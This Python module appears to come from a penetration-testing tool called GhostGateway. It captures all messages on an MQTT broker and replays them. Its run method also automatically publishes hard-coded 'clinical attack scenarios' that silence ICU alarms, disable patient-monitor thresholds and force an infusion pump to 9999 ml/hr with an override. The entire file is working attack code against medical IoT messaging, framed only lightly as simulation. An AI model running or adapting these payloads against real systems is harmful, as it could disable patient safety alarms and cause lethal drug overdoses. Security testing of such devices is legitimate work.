"""
GhostGateway - MQTT Replay Module
Captures broker messages and replays them (replay attack simulation).
"""

import time
import threading
import paho.mqtt.client as mqtt
from utils.logger import get_logger

logger = get_logger("MQTT-Replay")


class MQTTReplay:
    def __init__(self, broker, port=1883, verbose=False):
        self.broker = broker
        self.port = port
        self.verbose = verbose
        self.captured = []
        self.findings = []

    def capture(self, topic="#", duration=5):
        """Capture MQTT messages from broker"""
        logger.info(f"[REPLAY] Capturing from [{topic}] for {duration}s")
        captured = []

        def on_message(client, userdata, msg):
            entry = {"topic": msg.topic, "payload": msg.payload, "qos": msg.qos}
            captured.append(entry)
            logger.info(f"  [CAP] [{msg.topic}] -> {msg.payload[:60]}")

        client = mqtt.Client(client_id="ghostgateway_capture")
        client.on_message = on_message

        try:
            client.connect(self.broker, self.port, keepalive=duration + 2)
            client.subscribe(topic, qos=0)
            client.loop_start()
            time.sleep(duration)
            client.loop_stop()
            client.disconnect()
        except Exception as e:
            logger.warning(f"[REPLAY] Capture failed: {e}")

        self.captured = captured
        logger.info(f"[REPLAY] Captured {len(captured)} messages")
        return captured

    def replay_messages(self, messages=None, delay=0.3):
        """Replay captured messages back to broker"""
        if messages is None:
            messages = self.captured

        if not messages:
            logger.warning("[REPLAY] No messages to replay")
            return

        logger.info(f"[REPLAY] Replaying {len(messages)} messages...")
        client = mqtt.Client(client_id="ghostgateway_replayer")

        try:
            client.connect(self.broker, self.port, keepalive=30)
            client.loop_start()
            for msg in messages:
                info = client.publish(msg["topic"], msg["payload"], qos=msg.get("qos", 0))
                info.wait_for_publish(timeout=2)
                logger.info(f"  [->] Replayed [{msg['topic']}] : {msg['payload'][:60]}")
                self.findings.append({
                    "check": f"MQTT Replay: {msg['topic']}",
                    "severity": "HIGH",
                    "detail": f"Message replayed on [{msg['topic']}]. Payload: {msg['payload'][:100]}"
                })
                time.sleep(delay)
            client.loop_stop()
            client.disconnect()
        except Exception as e:
            logger.warning(f"[REPLAY] Replay failed: {e}")

    def replay_predefined_clinical(self):
        """Replay known clinical attack scenarios"""
        logger.info("[REPLAY] Replaying predefined clinical scenarios...")
        scenarios = [
            {"topic": "ward/icu/device/command",
             "payload": b'{"command":"ALARM_SILENCE","duration":99999}',
             "qos": 1},
            {"topic": "patient/monitor/threshold",
             "payload": b'{"heartrate_max":9999,"spo2_min":0}',
             "qos": 1},
            {"topic": "device/infusion/pump/rate",
             "payload": b'{"rate_ml_hr":9999,"override":true}',
             "qos": 1},
        ]
        self.replay_messages(scenarios, delay=0.5)

    def run(self, topic="#"):
        logger.info("=" * 50)
        logger.info("  MQTT REPLAY MODULE - GhostGateway")
        logger.info("=" * 50)
        self.capture(topic=topic, duration=5)
        self.replay_messages()
        self.replay_predefined_clinical()
        logger.info(f"[REPLAY] Complete. {len(self.findings)} findings.")
        return self.findings
